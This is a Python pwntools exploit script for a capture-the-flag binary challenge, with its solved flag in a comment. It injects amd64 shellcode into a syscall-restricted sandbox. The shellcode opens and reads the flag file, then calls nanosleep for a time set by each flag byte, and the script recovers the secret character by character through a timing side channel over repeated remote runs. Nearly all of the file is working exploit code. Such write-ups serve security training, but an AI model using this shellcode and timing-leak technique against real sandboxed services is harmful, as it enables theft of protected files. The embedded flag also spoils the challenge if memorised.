#!/usr/bin/env python3

# flag{1_r34lLy_h0p3_u_d1d_a_b1n4ry_s34rCh}

# Only 5 syscall allowed: read, write, open, exit and nanosleep.
# The given wrapper measures the execution time.
# stdout and stderr are not available.
# There is an alarm for 3 seconds, so time must be chosen carefully.
# Max 1024 chars.

# The solution is to execute multiple time the binary.
# Each time wait for a specific period of time based on the ascii value of each character of the flag.

# int nanosleep(const struct timespec *req, struct timespec *rem);
# each struct is composed by two long integer
# one for seconds and one for nanoseconds

# Look to main.c for tests about c and nanosleep.

import sys
from pwn import *
from pwn import p64

# time interval for each letter
# (chr(letter) - 0x20) * TIME_INTERVAL is the time waited for each letter
# 0x20 to remove unprintable characters
TIME_INTERVAL = 1e+7

shellcode_save_buffer_address = asm("""
mov rbx, rax
""", arch='amd64')

shellcode_open_file = asm("""
mov rax, 2
mov rdi, rbx
add rdi, 1000
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

shellcode_read = asm("""
mov rdi, rax
mov rax, 0
mov rsi, rbx
add rsi, 900
mov rdx, 60
syscall
""", arch='amd64')

shellcode_exit = asm("""
xor rax, rax
mov rax, 0x3c
mov rdi, 3
syscall
""", arch='amd64')


# start_process for a new execution
def start_process():
    if "--remote" in sys.argv:
        p = remote("bin2.ctf.offdef.it", 4001)
    else:
        p = process("./wrapper.py")

    if "--debug" in sys.argv:
        context.terminal = ["terminator", "-e"]
        gdb.attach(p, """
        b *0x4013a0
        """)

    return p


def build_payload_nanosleep(pos):
    payload = []

    # buffer address for first struct
    payload.append("mov rdi, rbx")

    # address for the struct, enough bigger to avoid touching anything else
    payload.append("add rdi, 200")

    # clean rcx
    payload.append("mov rcx, 0")

    # set seconds to zero
    payload.append("mov [rdi], rcx")

    # set buffer address in rcx
    payload.append("mov rcx, rbx")

    # flag address
    payload.append("add rcx, 900")

    # calculate address of char to read
    payload.append("add rcx, %d" % pos)

    # clean rdx
    payload.append("xor rdx, rdx")

    # read flag[pos], using dl for one byte
    payload.append("mov dl, [rcx]")

    # normalize by removing unprintable chars
    payload.append("sub rdx, 0x20")

    # Set value in rax for multiplication.
    payload.append("mov rax, %d" % TIME_INTERVAL)

    # Multiply ascii value per TIME_INTERVAL, result is saved in rax.
    payload.append("mul rdx")

    # Set nanoseconds field with the value obtained after multiplication.
    payload.append("mov [rdi + 8], rax")

    # Set second struct for remaining time with everything to zero.
    # This is done only to avoid any problems.
    payload.append("mov rsi, rdi")

    # Use next area after prev struct for requested time.
    payload.append("add rsi, 0x10")

    # use rcx to set zero
    payload.append("mov rcx, 0")

    # set seconds field to zero
    payload.append("mov [rsi], rcx")

    # set nanoseconds field to zero
    payload.append("mov [rsi + 8], rcx")

    # nanosleep syscall code.
    payload.append("mov rax, 0x23")
    payload.append("syscall")
    return asm("\n".join(payload), arch='amd64')


def build_payload(pos, test_payload=False):
    payload = shellcode_save_buffer_address
    payload += shellcode_open_file
    payload += shellcode_read

    if not test_payload:
        payload += build_payload_nanosleep(pos)

    payload += shellcode_exit

    payload = payload.ljust(1000, b"\x00")

    if "--remote" in sys.argv:
        payload += b"/chall/flag\0"
    else:
        payload += b"./fake_flag.txt\0"

    payload = payload.ljust(1024, b"\x00")

    return payload


def run_process(pos, test_payload=False):
    p = start_process()
    payload = build_payload(pos, test_payload)
    p.sendline(payload)
    p.recvuntil("Time: ")
    delta = float(p.recvline())
    p.close()
    return delta


def calc_char_time(i):
    t = (i - 0x20) * TIME_INTERVAL
    t /= 1e+9
    return t


# print_chars_time print time for each ascii character (used for debugging)
def print_chars_time():
    chars_time = {}
    for i in range(0x20, 128):
        chars_time[chr(i)] = calc_char_time(i)
    print(chars_time)


flag = ""
count = 0
while count == 0 or flag[-1] != "}":
    mean_char_time = 0
    # Doing the request multiple times for the same char.
    # In this way it is possible to calculate the average delta time.
    for i in range(10):
        delta = run_process(count)
        mean_char_time += delta  # calculating average delta
        mean_char_time /= 2
        print("Test char %d iteration %d with time %f" % (count+1, i+1, delta))

    print("Result char %d is time %f" % (count + 1, mean_char_time))

    found = False
    # search for the char
    for i in range(0x20, 128):
        # average delta time should be greater of the char required time
        # and lower then the next one.
        if mean_char_time >= calc_char_time(i) and mean_char_time <= calc_char_time(i) + TIME_INTERVAL / 1e+9:
            flag += chr(i)
            found = True

    # if no char has been found something is wrong :(
    if not found:
        print("Char not found!")
        flag += " "

    print("Actual flag: ", flag)

    print("\n\n\n")
    count += 1

print("The flag is ", flag)
